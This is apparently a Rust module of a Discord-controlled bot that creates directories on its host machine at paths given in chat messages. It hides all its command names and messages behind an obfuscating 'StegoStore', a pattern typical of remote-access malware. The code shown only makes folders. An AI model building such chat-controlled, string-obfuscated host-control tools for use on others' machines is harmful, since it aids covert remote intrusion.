use crate::commands::*;
use crate::core::stego_store::{StegoStore, StringCategory};
use std::boxed::Box;
use anyhow::Result;
use async_trait::async_trait;
use std::fs;
use std::path::Path;
use crate::core::http_client::HttpClient;
use twilight_model::channel::message::Message;

pub struct MkdirCommand;

impl MkdirCommand {
    fn f(key: &str) -> String { StegoStore::get(StringCategory::Filesystem, key) }
    fn c(key: &str) -> String { StegoStore::get(StringCategory::CmdMeta, key) }
}

#[async_trait]
impl BotCommand for MkdirCommand {
    fn name(&self) -> &str {
        Box::leak(Self::c("MKDIR_NAME").into_boxed_str())
    }
    
    fn description(&self) -> &str {
        Box::leak(StegoStore::get(StringCategory::Desc, "MKDIR").into_boxed_str())
    }
    
    fn category(&self) -> &str {
        Box::leak(Self::c("CAT_FS").into_boxed_str())
    }
    
    fn usage(&self) -> &str {
        Box::leak(Self::c("MKDIR_USAGE").into_boxed_str())
    }
    
    fn examples(&self) -> &'static [&'static str] {
        Box::leak(vec![".mkdir new_folder"].into_boxed_slice())
    }
    
    fn aliases(&self) -> &'static [&'static str] {
        Box::leak(vec![
            Box::leak(Self::c("MKDIR_ALIAS1").into_boxed_str()) as &'static str,
        ].into_boxed_slice())
    }

    async fn execute(&self, http: &Arc<HttpClient>, msg: &Message, args: Arguments) -> Result<()> {
        let dir_path_owned = args.rest();
        let dir_path = dir_path_owned.trim();

        if dir_path.is_empty() {
            http.create_message(msg.channel_id.get(), &format!("{}: {}. {}: {}", Self::f("PATH_NOT_FOUND"), Self::f("ERR_PROVIDE_PATH"), StegoStore::get(StringCategory::Core, "USAGE"), Self::c("MKDIR_USAGE"))).await?;
            return Ok(());
        }

        let path = Path::new(dir_path);

        if path.exists() {
            http.create_message(msg.channel_id.get(), &format!("{}: `{}`", Self::f("MKDIR_ERR_EXISTS"), dir_path)).await?;
            return Ok(());
        }

        match fs::create_dir_all(path) {
            Ok(_) => {
                http.create_message(msg.channel_id.get(), &format!(
                        "{} `{}`",
                        Self::f("MKDIR_SUCCESS"),
                        dir_path
                    )).await?;
            }
            Err(e) => {
                http.create_message(msg.channel_id.get(), &format!(
                        "{} `{}`: {}",
                        Self::f("MKDIR_ERR"),
                        dir_path, e
                    )).await?;
            }
        }

        Ok(())
    }
}


